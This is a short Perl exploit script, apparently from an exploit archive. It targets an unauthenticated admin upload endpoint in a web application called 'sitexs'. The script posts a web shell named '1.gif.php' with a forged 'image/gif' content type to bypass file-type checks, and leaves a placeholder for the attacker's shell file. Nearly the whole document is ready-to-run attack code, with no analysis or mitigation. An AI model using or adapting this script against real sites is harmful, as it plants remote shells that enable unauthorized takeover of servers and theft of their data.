#!/usr/bin/perl
# Author : Hadi Kiamarsi
# Discover By : Hadi Kiamarsi
# Exploit By : Hadi Kiamarsi 
use LWP;
use HTTP::Request::Common;
$ua = $ua = LWP::UserAgent->new;;
$res = $ua->request(POST 'http:www.example.com/[sitexs]/adm/visual/upload.php',     
             Content_Type => 'form-data',
             Content => [
              UPLOAD => ["Your shell file path", "1.gif.php", "Content-Type" => 
"image/gif"],submit => 'true',type => 'images',path => '',process => 'true',
             ],
		    );
print $res->as_string();
